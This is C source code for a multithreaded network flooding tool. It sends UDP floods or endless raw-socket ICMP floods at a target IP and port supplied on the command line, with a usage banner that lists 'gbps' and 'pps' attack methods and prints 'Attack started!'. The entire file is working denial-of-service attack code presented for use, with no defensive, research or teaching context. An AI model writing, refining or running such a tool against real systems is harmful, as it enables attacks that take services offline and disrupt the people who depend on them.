#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <netinet/ip_icmp.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <netinet/ip.h>

#define Red     "\033[31m"
#define Green   "\033[32m"
#define Yellow  "\033[33m"
#define Blue    "\033[34m"
#define Reset   "\033[0m"

uint16_t checksum(void *b, int len) {
    uint16_t *buf = b;
    unsigned int sum = 0;
    unsigned short gbyte;
    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1) {
        gbyte = 0;
        memcpy(&gbyte, buf, 1);
        sum += gbyte;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (uint16_t)(~sum);
}

void *icmp_attack(void *args) {
    char *target = (char *)args;
    struct sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    inet_pton(AF_INET, target, &dest_addr.sin_addr);

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        perror("Socket error");
        return NULL;
    }

    char packet[64];
    struct icmphdr *icmp_header = (struct icmphdr *)packet;

    while (1) {
        memset(packet, 0, sizeof(packet));
        icmp_header->type = ICMP_DEST_UNREACH;
        icmp_header->code = 0;
        icmp_header->un.echo.id = getpid();
        icmp_header->un.echo.sequence = rand();
        icmp_header->checksum = checksum(icmp_header, sizeof(struct icmphdr));
        sendto(sock, packet, sizeof(struct icmphdr), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    }
    close(sock);
    return NULL;
}

void *send_udp_packets(void *arg) {
    struct sockaddr_in server_addr;
    int sock, size;
    char *payload;
    struct sockaddr_in *addr = (struct sockaddr_in *)arg;

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    size = atoi(getenv("BYTES"));
    payload = (char *)malloc(size);

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < atoi(getenv("ATTACK_TIME"))) {
        if (sendto(sock, payload, size, 0, (struct sockaddr *)addr, sizeof(*addr)) < 0) {
            perror("Send failed");
            close(sock);
            pthread_exit(NULL);
        }
    }

    close(sock);
    free(payload);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc < 7) {
        fprintf(stderr, Red "Usage: %s <ip> <port> <threads> <bytes> <attack_time> <method>\n" Reset, argv[0]);
        printf(Yellow "gbps = 1400 byte\n" Reset);
        printf(Yellow "pps = 20 byte\n" Reset);
        printf(Blue "Methods: normal,pps\n" Reset);
        return 1;
    }

    const char *ip = argv[1];
    int port = atoi(argv[2]);
    int threads = atoi(argv[3]);
    int bytes = atoi(argv[4]);
    int attack_time = atoi(argv[5]);
    const char *method = argv[6];

    setenv("BYTES", argv[4], 1);
    setenv("ATTACK_TIME", argv[5], 1);

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        perror("Invalid address or Address not supported");
        return 1;
    }

    printf(Green "Attack started!\n" Reset);

    pthread_t tid[threads];
    if (strcmp(method, "pps") == 0) {
        // If method is "pps", perform ICMP attack instead
        for (int i = 0; i < threads; i++) {
            if (pthread_create(&tid[i], NULL, icmp_attack, (void *)ip) != 0) {
                perror("Thread creation failed");
                return 1;
            }
        }
    } else {
        // Default attack (UDP)
        for (int i = 0; i < threads; i++) {
            if (pthread_create(&tid[i], NULL, send_udp_packets, (void *)&server_addr) != 0) {
                perror("Thread creation failed");
                return 1;
            }
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(tid[i], NULL);
    }

    return 0;
}
